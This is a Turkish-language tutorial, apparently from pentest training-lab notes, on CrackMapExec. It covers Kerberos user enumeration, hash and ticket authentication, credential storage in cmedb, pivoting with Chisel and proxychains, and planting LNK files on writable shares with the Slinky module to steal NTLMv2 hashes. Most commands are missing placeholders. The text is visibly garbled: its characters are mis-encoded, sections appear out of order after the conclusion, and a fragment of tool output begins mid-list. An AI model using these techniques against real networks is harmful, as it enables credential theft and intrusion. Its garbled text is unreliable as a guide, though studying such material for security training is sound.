### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

Yeni Kerberos kimlik doÄŸrulama uygulamasÄ± ile CrackMapExec, CME iÃ§inde kendi `Kerbrute`'unu oluÅŸturmak iÃ§in tÃ¼m bileÅŸenlere sahiptir. Bu, CME'nin bir kullanÄ±cÄ±nÄ±n domain Ã¼zerinde var olup olmadÄ±ÄŸÄ±nÄ± ve bu kullanÄ±cÄ±nÄ±n Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek ÅŸekilde yapÄ±landÄ±rÄ±lÄ±p yapÄ±landÄ±rÄ±lmadÄ±ÄŸÄ±nÄ± anlayabileceÄŸi anlamÄ±na gelir. Bunu aÅŸaÄŸÄ±daki hesaplarla Ã§alÄ±ÅŸÄ±rken gÃ¶relim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

{{CODE_BLOCK_246}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `Kerbrute` CrackMapExec TGT isteklerini Ã¶n kimlik doÄŸrulamasÄ± olmadan gÃ¶nderdiÄŸinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasÄ±yla yanÄ±t verirse, kullanÄ±cÄ± adÄ± mevcut deÄŸildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasÄ±yla yanÄ±t verir, bu da kullanÄ±cÄ± adÄ±nÄ±n mevcut olduÄŸu anlamÄ±na gelir. Son olarak, `asreproast` saldÄ±rÄ±sÄ±na karÅŸÄ± savunmasÄ±z bir hata hesabÄ± gÃ¶rÃ¼rsek, daha Ã¶nce `AESREPRoast` HesaplarÄ±nÄ± Bulma bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi AESREPoast saldÄ±rÄ±larÄ±na karÅŸÄ± hassastÄ±r.

Bu, oturum aÃ§ma hatalarÄ±na neden olmaz, bu nedenle herhangi bir hesabÄ± kilitlemez, ancak Kerberos logu etkinleÅŸtirilmiÅŸse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralÄ± bir Windows olay kimliÄŸi oluÅŸturur.


### AES-128 veya AES-256 kullanma

AyrÄ±ca, Kerberos Kimlik DoÄŸrulamasÄ± iÃ§in AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araÃ§lar, genellikle bu tÃ¼r hash'leri alabilir. AES-128 veya AES-256 kullandÄ±ÄŸÄ±mÄ±zda, trafiÄŸimiz normal Kerberos trafiÄŸine daha Ã§ok benzeyecek ve bu da operasyonel bir avantaj (opsec) saÄŸlayacaktÄ±r. Hadi Secretsdump'u kullanalÄ±m ve ardÄ±ndan AES256 ile kimlik doÄŸrulamasÄ± yapalÄ±m.


### AES256 ile Kimlik DoÄŸrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanÄ±cÄ±nÄ±n oturumu sÃ¼rdÃ¼ÄŸÃ¼ sÃ¼rece geÃ§erli kalÄ±rlar, bu nedenle servislere birden fazla kez kimlik doÄŸrulamasÄ± yapmak (Ã¶rneÄŸin, bir web veya posta sunucusuna birden fazla kez baÄŸlanmak) her seferinde KDC ile iletiÅŸim kurmayÄ± gerektirmez.

Ã‡oÄŸu durumda, Linux makineleri Kerberos tickerlarÄ± ccache dosyalarÄ± olarak depolar, sistemlerin ticketlarÄ± kullanma ÅŸekli, `ccache` dosyasÄ±nÄ±n yolunu gÃ¶steren `KRB5CCNAME` environment variable aracÄ±lÄ±ÄŸÄ±yla olur. robert kullanÄ±cÄ±sÄ± iÃ§in bir ticket (ccache dosyasÄ±) oluÅŸturalÄ±m ve DC01'e kimlik doÄŸrulamasÄ± yapalÄ±m

Ticket'Ä± oluÅŸturmak iÃ§in [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracÄ±nÄ± kullanacaÄŸÄ±z ve KRB5CCNAME environment variable'i getTGT.py tarafÄ±ndan oluÅŸturulan ccache dosyasÄ±nÄ±n yoluna ayarlayacaÄŸÄ±z.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doÄŸrulama yÃ¶ntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak iÃ§in `--use-kcache` seÃ§eneÄŸini kullanmamÄ±z gerekir. KullanÄ±cÄ± adÄ± ve parola seÃ§enekleri gerekli deÄŸildir.


### ccache DosyasÄ±nÄ± Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak Kullanma (SMB ProtokolÃ¼)

{{CODE_BLOCK_251}}


### Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak ccache DosyasÄ±nÄ±n KullanÄ±lmasÄ± (LDAP ProtokolÃ¼)

{{CODE_BLOCK_252}}

Kerberos Kimlik DoÄŸrulamasÄ±nÄ± `MSSQL` protokolÃ¼ ile kullanmak iÃ§in hedef olarak IP adresi yerine bilgisayar adÄ±nÄ± veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolÃ¼nÃ¼n perde arkasÄ±nda IP'yi FQDN'ye dÃ¶nÃ¼ÅŸtÃ¼rmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasÄ±dÄ±r.


### MSSQL ProtokolÃ¼ ile ccache DosyasÄ±nÄ± Kullanma

{{CODE_BLOCK_253}}

KullanÄ±cÄ± adlarÄ± ve parolalarla yaptÄ±ÄŸÄ±mÄ±z gibi Kerberos kimlik doÄŸrulamasÄ± ile herhangi bir modÃ¼lÃ¼ veya seÃ§eneÄŸi Ã§alÄ±ÅŸtÄ±rabiliriz


### Kerberos Kimlik DoÄŸrulamasÄ± ile PaylaÅŸÄ±mlarÄ± Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'Ä±n nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrendik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, CrackMapExec veritabanÄ± `cmedb` ile etkileÅŸime gireceÄŸiz

---


### CMEDB'de UzmanlaÅŸmak

CME otomatik olarak tÃ¼m kullanÄ±lan/dump edilen kimlik bilgilerini (diÄŸer bilgilerle birlikte) ilk Ã§alÄ±ÅŸtÄ±rmada kurulan `SQLite` veritabanÄ±nda saklar. TÃ¼m Ã§alÄ±ÅŸma alanlarÄ± ve ilgili veritabanlarÄ± `~/.cme/workspaces` iÃ§inde saklanÄ±r. VarsayÄ±lan veritabanlarÄ± `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol iÃ§in bir SQLite dosyasÄ± bulunur.


### VarsayÄ±lan VeritabanlarÄ±nÄ± Listeleme

{{CODE_BLOCK_255}}

### VeritabanÄ± ile EtkileÅŸim

CME, back-end veritabanÄ± ile etkileÅŸimi kolaylaÅŸtÄ±ran ikinci bir komut satÄ±rÄ± script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i gÃ¶tÃ¼recektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

VarsayÄ±lan workspace adÄ± `default` olarak adlandÄ±rÄ±lÄ±r (bilgi `prompt` gÃ¶sterildiÄŸi gibi). Bir workspace seÃ§ildiÄŸinde, CME'de yaptÄ±ÄŸÄ±mÄ±z her ÅŸey bu workspace'de saklanacaktÄ±r. Bir workspace oluÅŸturmak iÃ§in, `cmedb (default) >` komut promt root'una gitmemiz gerekir. EÄŸer protokol veritabanÄ±ndaysak, geri komutunu kullanmamÄ±z gerekir.


### Creating a Workspace

{{CODE_BLOCK_257}}

Workspace'leri listelemek iÃ§in `workspace list` , workspace'i deÄŸiÅŸtirmek iÃ§in ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve DeÄŸiÅŸtirme

{{CODE_BLOCK_258}}


### Bir ProtokolÃ¼n VeritabanÄ±na EriÅŸim

cmedb her protokol iÃ§in bir veritabanÄ±na sahiptir, ancak bu modÃ¼lÃ¼n yazÄ±ldÄ±ÄŸÄ± sÄ±rada yalnÄ±zca `SMB` ve `MSSQL` yararlÄ± seÃ§eneklere sahiptir:

| Protokol | SeÃ§enekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolÃ¼n veritabanÄ±na eriÅŸmek iÃ§in `proto` `<protocol>` komutunu Ã§alÄ±ÅŸtÄ±rÄ±n. Protokol iÃ§inde, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `help` seÃ§eneÄŸini kullanabiliriz:

### SMB Protokol VeritabanÄ±na BaÄŸlanma

{{CODE_BLOCK_259}}


### Protocol Options

SMB veya MSSQL protokolÃ¼nÃ¼ her kullandÄ±ÄŸÄ±mÄ±zda, kimlik bilgileri, saldÄ±rdÄ±ÄŸÄ±mÄ±z hostlar, eriÅŸtiÄŸimiz paylaÅŸÄ±mlar ve listelediÄŸimiz gruplar CrackMapExec veritabanÄ±nda saklanÄ±r. VeritabanÄ±nda sahip olduÄŸumuz verilere eriÅŸelim.

### Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

CrackMapExec veritabanÄ±, CrackMapExec kullanarak kullandÄ±ÄŸÄ±mÄ±z veya elde ettiÄŸimiz tÃ¼m kimlik bilgilerini depolar. Bu veritabanÄ±, kimlik bilgilerinin tÃ¼rÃ¼nÃ¼, `dÃ¼z metin` veya `hash` olup olmadÄ±ÄŸÄ±nÄ±, domain, kullanÄ±cÄ± adÄ± ve ÅŸifreyi saklar. SMB protokolÃ¼nÃ¼n kimlik bilgilerini gÃ¶rmek iÃ§in protokol iÃ§indeki `creds` seÃ§eneÄŸini kullanmamÄ±z gerekir.


### Displaying SMB Credentials

{{CODE_BLOCK_260}}


GÃ¶rdÃ¼ÄŸÃ¼nÃ¼z gibi, creds'ten sonra bir `kullanÄ±cÄ± adÄ±` ekleyerek belirli kullanÄ±cÄ±larÄ± da sorgulayabiliriz. AyrÄ±ca `creds hash` seÃ§eneÄŸi ile tÃ¼m hash'leri veya `creds plaintext` seÃ§eneÄŸi ile tÃ¼m plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve DÃ¼z Metin Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_261}}


Not: cmedb, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolÃ¼ne kaydedilir ve SMB kimlik bilgilerini gÃ¶rÃ¼ntÃ¼lediÄŸimiz gibi gÃ¶rÃ¼ntÃ¼lenebilir


### MSSQL iÃ§in Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_262}}

Not: Domain alanÄ±nÄ± bir bilgisayar ile gÃ¶rÃ¼yorsak, bu bir MSSQL hesabÄ± kullandÄ±ÄŸÄ±mÄ±z anlamÄ±na gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak iÃ§in veritabanÄ±ndaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediÄŸimiz kimlik bilgilerini tanÄ±mlamamÄ±z ve hangi id'nin hesapla iliÅŸkili olduÄŸunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalÄ±m. KullanÄ±cÄ± adÄ± ve parola yerine bir kimlik bilgisi kullanmak iÃ§in `-id CredID` seÃ§eneÄŸini kullanmamÄ±z gerekir.

### CrackMapExec ile EtkileÅŸim iÃ§in CredID KullanÄ±mÄ±

{{CODE_BLOCK_263}}


### Hosts Information

MSSQL ve SMB iÃ§in, eriÅŸim saÄŸladÄ±ÄŸÄ±mÄ±z bilgisayarlarÄ±, IP'lerini, domainlerini ve iÅŸletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

{{CODE_BLOCK_264}}


### Share Information

CME veritabanÄ± da belirlediÄŸimiz paylaÅŸÄ±mlÄ± klasÃ¶rleri saklÄ±yor ve okuma ve yazma eriÅŸimine sahip kullanÄ±cÄ±larÄ±mÄ±z olup olmadÄ±ÄŸÄ±nÄ± bize sÃ¶ylÃ¼yor. PaylaÅŸÄ±m bilgilerine eriÅŸmek iÃ§in `cmedb` iÃ§erisinde SMB protokolÃ¼ iÃ§erisinde `shares` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.

### PaylaÅŸÄ±mlarÄ± Geri Alma

{{CODE_BLOCK_265}}


### KullanÄ±cÄ± Ekleme ve KaldÄ±rma

CME, kullanÄ±cÄ±larÄ± veritabanÄ±ndan manuel olarak ekleme veya kaldÄ±rma Ã¶zelliÄŸini destekler. ProtokolÃ¼ (SMB veya MSSQL) seÃ§iyoruz ve `creds add` veya `creds remove` kullanÄ±yoruz.


### cmedb'ye KullanÄ±cÄ± Ekleme

{{CODE_BLOCK_266}}

Åimdi eklediÄŸimiz kullanÄ±cÄ±yÄ± kaldÄ±rmayÄ± deneyebiliriz.

### Bir KullanÄ±cÄ±yÄ± cmedb'den KaldÄ±rma

{{CODE_BLOCK_267}}


### Empire Kimlik Bilgilerini Ä°mport Etme

cmedb'nin sahip olduÄŸu bir baÅŸka Ã¶zellik de `Empire`'dan kimlik bilgilerini import etme yeteneÄŸidir.


### Import from Empire

{{CODE_BLOCK_268}}

Not: Bu Ã¶zelliÄŸi kullanmak istiyorsanÄ±z `Empire`'Ä± yapÄ±landÄ±rdÄ±ÄŸÄ±nÄ±zdan emin olun

### Export cmedb Data

CrackMapExec veritabanÄ±ndan kimlik bilgilerini, hostlarÄ±, local adminleri ve paylaÅŸÄ±mlarÄ± export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

{{CODE_BLOCK_269}}

{{CODE_BLOCK_270}}

Veriler CSV dosyasÄ± olarak dÄ±ÅŸa aktarÄ±lÄ±r. `LibreOffice` veya `Excel` gibi araÃ§larÄ± kullanarak aÃ§abiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, aÄŸ gÃ¼venliÄŸi testlerinde ve sÄ±zma testlerinde kullanÄ±cÄ±larÄ±n iÅŸini kolaylaÅŸtÄ±ran, etkili bir araÃ§tÄ±r. GeniÅŸ protokol desteÄŸi, hÄ±zlÄ± keÅŸif, gÃ¼venlik aÃ§Ä±klarÄ± tespiti ve yÃ¶netimsel haklar elde etme gibi Ã§eÅŸitli Ã¶zellikleriyle gÃ¼venlik profesyonellerinin vazgeÃ§ilmez araÃ§larÄ± arasÄ±nda yer alÄ±r. Bu araÃ§, aÄŸ yapÄ±larÄ±nÄ±n daha gÃ¼venli hale getirilmesi iÃ§in Ã¶nemli bir rol oynar ve her gÃ¼venlik uzmanÄ±nÄ±n repertuarÄ±nda bulunmasÄ± gereken bir araÃ§tÄ±r.


, 'netlogon', 'sysvol']
SPIDER_P... 10.129.203.121 445 DC01 [*] EXT:
['ico', 'lnk']
SPIDER_P... 10.129.203.121 445 DC01 [*] SIZE: 51200
SPIDER_P... 10.129.203.121 445 DC01 [*] OUTPUT:
/tmp/cme_spider_plus
```

Dizine gidebilir ve kullanÄ±cÄ±nÄ±n eriÅŸebileceÄŸi tÃ¼m dosyalarÄ±n bir listesini alabiliriz:


### KullanÄ±cÄ±nÄ±n KullanabileceÄŸi DosyalarÄ± Listeleme

{{CODE_BLOCK_94}}

EÄŸer paylaÅŸÄ±mÄ±n tÃ¼m iÃ§eriÄŸini indirmek istiyorsak `READ_ONLY=false` seÃ§eneÄŸini aÅŸaÄŸÄ±daki gibi kullanabiliriz:

{{CODE_BLOCK_95}}

{{CODE_BLOCK_96}}

Not: SabÄ±rlÄ± olmamÄ±z gerekiyor. PaylaÅŸÄ±lan klasÃ¶r ve dosya sayÄ±sÄ±na baÄŸlÄ± olarak iÅŸlem birkaÃ§ dakika sÃ¼rebilir

`spider_plus` modÃ¼lÃ¼ iÃ§in mevcut tÃ¼m seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `--options` seÃ§eneÄŸini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir `proxy` aracÄ±lÄ±ÄŸÄ±yla diÄŸer aÄŸlara ulaÅŸmak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± anlatÄ±lacaktÄ±r.


---


### Proxychains with CME

### Scenario

Ä°nternal bir Pentest Ã¼zerinde Ã§alÄ±ÅŸÄ±yoruz. Bir aÄŸ taramasÄ± gerÃ§ekleÅŸtirdik ve yalnÄ±zca bir host (10.129.204.133) tespit edip ele geÃ§irebildik. Ele geÃ§irilen bu host Ã¼zerinde `ipconfig` Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, iki aÄŸ baÄŸdaÅŸtÄ±rÄ±cÄ±sÄ± olduÄŸunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip baÅŸka bir hostu gÃ¶steriyor. TopladÄ±ÄŸÄ±mÄ±z bilgilere dayanarak aÅŸaÄŸÄ±daki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu aÄŸdaki (172.16.1.0/24) herhangi bir makineye saldÄ±rmak iÃ§in, saldÄ±rÄ± hostumuz ile MS01 arasÄ±nda bir `tÃ¼nel` kurmalÄ±yÄ±z. Bu nedenle, CME tarafÄ±ndan yÃ¼rÃ¼tÃ¼len tÃ¼m komutlar MS01 Ã¼zerinden geÃ§er.


### Set Up the Tunnel

TÃ¼nelimizi kurmak iÃ§in [Chisel](https://github.com/jpillora/chisel) kullanacaÄŸÄ±z. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldÄ±racaÄŸÄ±mÄ±z makinemiz iÃ§in en son Windows binary'sini ve saldÄ±rÄ± hostumuzda kullanmak iÃ§in en yeni Linux binary'sini indirelim ve aÅŸaÄŸÄ±daki adÄ±mlarÄ± gerÃ§ekleÅŸtirelim:

*  Chisel'Ä± SaldÄ±rÄ± Hostumuza indirin ve Ã‡alÄ±ÅŸtÄ±rÄ±n:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u Ä°ndirin ve Hedef Host'a YÃ¼kleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yÃ¼rÃ¼tme seÃ§eneÄŸi `-x`'i kullanarak Chisel sunucumuza baÄŸlanmak iÃ§in `chisel.exe` dosyasÄ±nÄ± Ã§alÄ±ÅŸtÄ±rÄ±n (Bu seÃ§eneÄŸi Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha fazla tartÄ±ÅŸacaÄŸÄ±z)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar Ã§alÄ±ÅŸmaya devam edecektir. Bunu bu bÃ¶lÃ¼mde daha sonra yapacaÄŸÄ±z.

**Attack host** Ã¼zerinde, **Chisel server** Ã§Ä±ktÄ±sÄ±nda **bir client baÄŸlantÄ±sÄ± aldÄ±ÄŸÄ±mÄ±zÄ± ve tÃ¼neli baÅŸlattÄ±ÄŸÄ±mÄ±zÄ±** gÃ¶steren yeni bir satÄ±r gÃ¶rmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediÄŸini kontrol ederek de tÃ¼nelin Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± doÄŸrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayÄ±lan portu `TCP 1080`'i kullanacak ÅŸekilde yapÄ±landÄ±rmamÄ±z gerekir. YapÄ±landÄ±rma dosyasÄ±nÄ±n ProxyList bÃ¶lÃ¼mÃ¼ne `socks5 127.0.0.1 1080`'i aÅŸaÄŸÄ±daki gibi eklediÄŸimizden emin olmamÄ±z gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* ArtÄ±k 172.16.1.10 IP'sine ulaÅŸmak iÃ§in `Proxychains` aracÄ±lÄ±ÄŸÄ±yla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains Ã§Ä±ktÄ±sÄ±nÄ± konsoldan kaldÄ±rmak iÃ§in `Proxychains4` ve `quiet -q` seÃ§eneÄŸini kullanabiliriz:

### Quiet SeÃ§eneÄŸi ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracÄ±lÄ±ÄŸÄ±yla herhangi bir CME iÅŸlemi gerÃ§ekleÅŸtirebiliriz.


### Killing Chisel on the Target Machine

Ä°ÅŸimiz bittiÄŸinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak iÃ§in, PowerShell komutlarÄ±nÄ± yÃ¼rÃ¼tmek iÃ§in `-X` seÃ§eneÄŸini kullanacaÄŸÄ±z ve PowerShell komutunu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z `Stop-Process - Name chisel -Force .` Komut yÃ¼rÃ¼tme konusunu Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptÄ±ktan sonra, Chisel client komutunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±z terminal aÅŸaÄŸÄ±daki gibi sonuÃ§lanmalÄ±dÄ±r:


### Chisel'i Zorla Durdurduktan Sonra Terminalin KapanmasÄ±

{{CODE_BLOCK_107}}

ArtÄ±k saldÄ±rÄ± konaÄŸÄ±mÄ±zdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Ãœzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak baÅŸlatarak ve saldÄ±rÄ± hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak baÅŸlatmak iÃ§in `server --socks5` seÃ§eneÄŸini kullanacaÄŸÄ±z.


### Chisel'i Hedef Makinede Sunucu Olarak BaÅŸlatma

{{CODE_BLOCK_109}}

Åimdi hedef makinemiz Chisel sunucusuna baÄŸlanmak ve proxy'yi etkinleÅŸtirmek iÃ§in IP ve porttan sonra `socks` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna BaÄŸlanma

{{CODE_BLOCK_110}}

Åimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e BaÄŸlanmak iÃ§in Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bÃ¶lÃ¼mde, **attack host** Ã¼zerinde **Proxychains** ve **Chisel** yapÄ±landÄ±rmayÄ± ve **CrackMapExec** kullanarak hedef makinede **Chisel** Ã§alÄ±ÅŸtÄ±rmayÄ± Ã¶ÄŸrendik.

Ä°lerleyen bÃ¶lÃ¼mlerde, diÄŸer aÄŸlara ulaÅŸmak iÃ§in `CrackMapExec` ve `Proxychains` kullanacaÄŸÄ±z.

---

### Stealing Hashes

Yeni hesaplarÄ± ele geÃ§irmek iÃ§in kullanÄ±lan en yaygÄ±n tekniklerden biri parola hashlerinin Ã§alÄ±nmasÄ±dÄ±r. Bunu baÅŸarmanÄ±n farklÄ± yÃ¶ntemleri vardÄ±r, ancak yaygÄ±n olanÄ±, bir bilgisayarÄ± veya kullanÄ±cÄ±yÄ± kontrol ettiÄŸimiz sahte bir paylaÅŸÄ±lan klasÃ¶rle bir kimlik doÄŸrulama iÅŸlemi baÅŸlatmaya zorlamaktÄ±r.

Bu kimlik doÄŸrulama iÅŸlemini baÅŸlatÄ±rken, kullanÄ±cÄ± veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araÃ§ kullanÄ±larak kÄ±rÄ±labilir veya kimlik bilgilerini bilmeden kullanÄ±cÄ±nÄ±n kimliÄŸine bÃ¼rÃ¼nmek iÃ§in baÅŸka bir bilgisayara iletilebilir.

PaylaÅŸÄ±lan klasÃ¶rleri kullanarak hash'leri Ã§almak iÃ§in bir kÄ±sayol oluÅŸturabilir ve kÄ±sayolda gÃ¶rÃ¼nen simge sahte paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼zÃ¼ gÃ¶sterecek ÅŸekilde yapÄ±landÄ±rabiliriz. KullanÄ±cÄ± paylaÅŸÄ±lan klasÃ¶re girdiÄŸinde, simgenin konumunu aramaya Ã§alÄ±ÅŸacak ve paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼ze karÅŸÄ± kimlik doÄŸrulamasÄ±nÄ± zorlayacaktÄ±r.

NTLMv2 hash'lerini toplama hakkÄ±nda daha fazla bilgi edinmek iÃ§in RedTeam Ekipler iÃ§in [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadÄ±](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kÄ±sayollarÄ±n kullanÄ±mÄ±nÄ± deÄŸil, aynÄ± amaca hizmet eden diÄŸer dosya tÃ¼rlerini de gÃ¶sterir.


### Slinky ModÃ¼lÃ¼

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafÄ±ndan oluÅŸturulan bir modÃ¼ldÃ¼r ve CME'deki en heyecan verici modÃ¼llerden biridir. Prensip basittir. ModÃ¼l, yazma izinlerine sahip tÃ¼m paylaÅŸÄ±mlarda belirtilen SMB sunucusuna bir UNC yolu iÃ§eren simge attribute'a sahip Windows kÄ±sayollarÄ± oluÅŸturur. Birisi paylaÅŸÄ±mÄ± ziyaret ettiÄŸinde, simge attribute'u sunucumuza giden bir UNC yolu iÃ§erdiÄŸi iÃ§in `Responder` kullanarak NTLMv2 hash'ini alacaÄŸÄ±z.

ModÃ¼lÃ¼n `SERVER` ve `NAME` olmak Ã¼zere iki zorunlu seÃ§eneÄŸi ve bir isteÄŸe baÄŸlÄ± `CLEANUP` seÃ§eneÄŸi vardÄ±r.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiÄŸimiz SMB sunucusunun IP'sine ve UNC yolunun iÅŸaret etmesini istediÄŸimiz yere karÅŸÄ±lÄ±k gelir. `NAME` seÃ§eneÄŸi kÄ±sayol dosyasÄ±na bir isim atar, `CLEANUP` ise iÅŸimiz bittiÄŸinde kÄ±sayolu silmek iÃ§indir.


### Chisel kullanarak baÄŸlama

Bu alÄ±ÅŸtÄ±rma iÃ§in lokal eriÅŸimi simÃ¼le edeceÄŸiz ve internal aÄŸa baÄŸlanmak iÃ§in Chisel ve Proxychains kullanacaÄŸÄ±z. Chisel zaten hedef makinemizde bir sunucu olarak Ã§alÄ±ÅŸÄ±yor ve bir client olarak baÄŸlanmamÄ±z ve daha sonra internal aÄŸÄ± numaralandÄ±rmak iÃ§in proxychains kullanmamÄ±z gerekiyor. Chisel kullanarak baÄŸlanmak iÃ§in aÅŸaÄŸÄ±daki komutu **kullanalÄ±m**


### Hedef Makine Chisel Sunucusuna BaÄŸlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Ã‡alÄ±nmasÄ±
Ä°lk olarak, `--shares` seÃ§eneÄŸini kullanarak `grace` kullanÄ±cÄ±sÄ±nÄ±n `WRITE` ayrÄ±calÄ±klarÄ±na sahip olduÄŸu bir paylaÅŸÄ±m bulalÄ±m:

### WRITE AyrÄ±calÄ±klarÄ±na Sahip PaylaÅŸÄ±mlarÄ± Bulma

{{CODE_BLOCK_114}}


GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `grace` `HR` ve `IT-Tools` paylaÅŸÄ±mlarÄ±na yazabilir. Bu nedenle her bir paylaÅŸÄ±ma bir `LNK` dosyasÄ± yazmak iÃ§in `Slinky` modÃ¼lÃ¼nÃ¼ kullanabiliriz. 

**SERVER=10.10.14.33** seÃ§eneÄŸini kullanarak **attack host**'umuzun **tun0** aÄŸÄ±ndaki **IP adresini** belirteceÄŸiz ve **NAME=important** seÃ§eneÄŸiyle **LNK dosyasÄ±na atanacak dosya adÄ±nÄ±** belirleyeceÄŸiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` aÃ§Ä±sÄ±ndan gÃ¼venli** olarak kabul edilir Ã§Ã¼nkÃ¼ tÃ¼m iÅŸlemler ya **`bellekte` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r**, ya **`WinAPI` Ã§aÄŸrÄ±larÄ±yla aÄŸ Ã¼zerinden sorgulanÄ±r**, ya da **Windows'un built-in araÃ§larÄ±/Ã¶zellikleri** kullanÄ±larak gerÃ§ekleÅŸtirilir.

